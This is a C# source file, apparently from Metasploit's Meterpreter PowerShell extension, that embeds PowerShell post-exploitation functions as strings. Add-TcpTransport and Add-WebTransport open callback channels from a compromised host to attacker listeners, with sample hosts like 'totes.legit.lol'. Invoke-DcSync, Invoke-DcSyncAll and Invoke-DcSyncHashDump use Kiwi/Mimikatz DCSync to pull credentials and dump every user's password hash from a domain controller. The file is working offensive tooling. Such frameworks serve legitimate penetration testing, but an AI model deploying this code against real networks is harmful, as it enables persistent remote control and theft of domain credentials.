using System.Collections.Generic;

namespace MSF.Powershell
{
    internal static class Scripts
    {
        private static readonly string AddTcpTransport = @"
function Add-TcpTransport {
  <#
    .SYNOPSIS
      Add an active TCP transport to the current session.

    .PARAMETER Lhost
      Specifies the listener host name or IP of the machine to connect to.

    .PARAMETER Lport
      Specifies port to connect back to.

    .PARAMETER CommTimeout
      Specifies the packet communications timeout (in seconds).

    .PARAMETER RetryTotal
      Specifies the total time to retry for when the transport disconnects (in seconds).

    .PARAMETER RetryWait
      Specifies the time to wait between each retry for when the transport disconnects (in seconds).

    .INPUTS
      None.

    .OUTPUTS
      True if successful, False otherwise.

    .EXAMPLE
        Add-TcpTransport -Lhost 10.1.1.1 -Lport 8000

    .EXAMPLE
        Add-TcpTransport -Lhost totes.legit.lol -Lport 1337
  #>
  param(
    [Parameter(Mandatory=$true)]
    [String]
    [ValidateNotNullOrEmpty()]
    $Lhost,
    [Parameter(Mandatory=$true)]
    [Int]
    $Lport,
    [Int]
    $CommTimeout,
    [Int]
    $RetryTotal,
    [Int]
    $RetryWait
  )
  $t = New-Object MSF.Powershell.Meterpreter.Transport+TransportInstance
  $t.Url = 'tcp://{0}:{1}' -f $Lhost, $Lport
  $t.CommTimeout = $CommTimeout
  $t.RetryTotal = $RetryTotal
  $t.RetryWait = $RetryWait

  return [MSF.Powershell.Meterpreter.Transport]::Add($t)
}";
        private static readonly string AddWebTransport = @"
function Add-WebTransport {
  <#
    .SYNOPSIS
      Add a web-based transport (http/s) to the current session.

    .PARAMETER Url
      Specifies the full URL of the listener that this transport will connect to.
      The URL must contain all components, including scheme (http/s), domain, port
      (if it's a non-standard port for the scheme) and LURI. There is no need to
      specify the Meterpreter URI as this is generated on the fly automatically.

    .PARAMETER CommTimeout
      Specifies the packet communications timeout (in seconds).

    .PARAMETER RetryTotal
      Specifies the total time to retry for when the transport disconnects (in seconds).

    .PARAMETER RetryWait
      Specifies the time to wait between each retry for when the transport disconnects (in seconds).

    .PARAMETER UserAgent
      Specifies user agent to use when making the web requests.

    .PARAMETER ProxyHost
      Specifies host address for the proxy server, if required.

    .PARAMETER ProxyUser
      Specifies username for proxy authentication, if required.

    .PARAMETER ProxyPass
      Specifies password for proxy authentication, if required.

    .PARAMETER CertHash
      Specifies the SHA1 hash of the https server certificate (as a hex-encoded string) that is
      expected to be presented.

    .INPUTS
      None.

    .OUTPUTS
      True if successful, False otherwise.

    .EXAMPLE
        Add-WebTransport -Url https://foo.com/someuri

    .EXAMPLE
        Add-WebTransport -Url http://foo.com:8080/myendpoint -RetryTotal 60 -RetryWait 5

    .EXAMPLE
        Add-WebTransport -Url https://foo.com -UserAgent 'TotesLegit (v1.0)' -CertHash 01A0EF17832F0356BD8164254BB725857465B918
  #>
  param(
    [Parameter(Mandatory=$true)]
    [String]
    [ValidateNotNullOrEmpty()]
    $Url,
    [Int]
    $CommTimeout,
    [Int]
    $RetryTotal,
    [Int]
    $RetryWait,
    [String]
    $UserAgent,
    [String]
    $ProxyHost,
    [String]
    $ProxyUser,
    [String]
    $ProxyPass,
    [String]
    $CertHash
  )
  # Make sure this URL is valid
  [System.Uri]$uri = $Url
  If (-not ($uri.Scheme.ToLower() -eq 'http' -Or $uri.Scheme.ToLower() -eq 'https')) {
    throw 'Specified scheme is invalid'
  }

  $t = New-Object MSF.Powershell.Meterpreter.Transport+TransportInstance
  $t.Url = $Url + [MSF.Powershell.Meterpreter.Transport]::GenerateTransportUri()
  $t.CommTimeout = $CommTimeout
  $t.UserAgent = $UserAgent
  $t.ProxyHost = $ProxyHost
  $t.ProxyUser = $ProxyUser
  $t.ProxyPass = $ProxyPass
  $t.RetryTotal = $RetryTotal
  $t.RetryWait = $RetryWait
  $t.CertHash = $CertHash

  return [MSF.Powershell.Meterpreter.Transport]::Add($t)
}
";
        private static readonly string InvokeDcSync = @"
function Invoke-DcSync {
  <#
    .SYNOPSIS
      Use the DCSync functionality to DCSync a single user from the target domain.

    .PARAMETER User
      Specifies the Domain\Username of the target user.

    .PARAMETER DomainController
      Specifies the domain controller to pull the information from.

    .PARAMETER DomainFqdn
      Specifies the FQDN of the domain.

    .INPUTS
      None.

    .OUTPUTS
      A single SyncRecord instance is returned.

    .EXAMPLE
      Invoke-DcSync -User VICIMDOMAIN\Administrator
  #>
  param(
    [Parameter(Mandatory=$true)]
    [String]
    [ValidateNotNullOrEmpty()]
    $User,
    [String]
    $DomainController,
    [String]
    $DomainFqdn
  )
  return [MSF.Powershell.Meterpreter.Kiwi]::DcSync($User, $DomainController, $DomainFqdn)
}";

        private static readonly string InvokeDcSyncAll = @"
function Invoke-DcSyncAll {
  <#
    .SYNOPSIS
      Use the DCSync functionality to DCSync every user that's present in the DC.

      It is recommended that this script be invoked inside channelised shell
      (via powershell_shell) because it can take a while in large domains.

    .PARAMETER Domain
      Specifies the domain name to contact for extracting all the users from.

    .PARAMETER DomainController
      Specifies the domain controller to pull the values from.

    .PARAMETER DomainFqdn
      Specifies the FQDN of the domain.

    .PARAMETER -IncludeEmpty
      If set to True, then all accounts that have ""empty"" hashes (generally disabled or
      unusable accounts) will be included in the output.

    .PARAMETER -IncludeMachineAccounts
      If set to True, then all accounts that are machine accounts (accounts ending in $)
      will be included in the output.

    .INPUTS
      None.

    .OUTPUTS
      A collection of SyncRecord instances is returned.

    .EXAMPLE
      Invoke-DcSyncAll -Domain VICIMDOMAIN
  #>
  param(
    [Parameter(Mandatory=$true)]
    [String]
    [ValidateNotNullOrEmpty()]
    $Domain,
    [String]
    $DomainController,
    [String]
    $DomainFqdn,
    [Switch]
    $IncludeEmpty,
    [Switch]
    $IncludeMachineAccounts
  )
  $s = New-Object MSF.Powershell.Meterpreter.Kiwi+DcSyncAllSettings
  $s.Domain = $Domain
  $s.DomainController = $DomainController
  $s.DomainFqdn = $DomainFqdn
  $s.IncludeEmpty = $IncludeEmpty
  $s.IncludeMachineAccounts = $IncludeMachineAccounts
  return [MSF.Powershell.Meterpreter.Kiwi]::DcSyncAll($s)
}";

        private static readonly string InvokeDcSyncHashDump = @"
function Invoke-DcSyncHashDump {
  <#
    .SYNOPSIS
      Use the DCSync functionality to dump every user hash from the DC. This is
      basically attempting to be a hashdump function that works remotely and doesn't
      require the need to be on the DC, or to extract NTDS.dit.

      It is recommended that this script be invoked inside channelised shell
      (via powershell_shell) because it can take a while in large domains.

    .PARAMETER Domain
      Specifies the domain name that is the target of the hash dumping.

    .PARAMETER DomainController
      Specifies the domain controller to pull the values from.

    .PARAMETER DomainFqdn
      Specifies the FQDN of the domain.

    .PARAMETER -IncludeEmpty
      If set to True, then all accounts that have ""empty"" hashes (generally disabled or
      unusable accounts) will be included in the output.

    .PARAMETER -IncludeMachineAccounts
      If set to True, then all accounts that are machine accounts (accounts ending in $)
      will be included in the output.

    .INPUTS
      None.

    .OUTPUTS
      A collection of String instances is returned that matches the typical hashdump format.

    .EXAMPLE
      Invoke-DcSyncHashDump -Domain VICIMDOMAIN
  #>
  param(
    [Parameter(Mandatory=$true)]
    [String]
    [ValidateNotNullOrEmpty()]
    $Domain,
    [String]
    $DomainController,
    [String]
    $DomainFqdn,
    [Switch]
    $IncludeEmpty,
    [Switch]
    $IncludeMachineAccounts
  )
  $s = New-Object MSF.Powershell.Meterpreter.Kiwi+DcSyncAllSettings
  $s.Domain = $Domain
  $s.DomainController = $DomainController
  $s.DomainFqdn = $DomainFqdn
  $s.IncludeEmpty = $IncludeEmpty
  $s.IncludeMachineAccounts = $IncludeMachineAccounts
  return [MSF.Powershell.Meterpreter.Kiwi]::DcSyncHashDump($s)
}";

        internal static IEnumerable<string> GetAllScripts()
        {
            return new List<string>
            {
                AddWebTransport,
                AddTcpTransport,
                InvokeDcSync,
                InvokeDcSyncAll,
                InvokeDcSyncHashDump,
            };
        }
    }
}
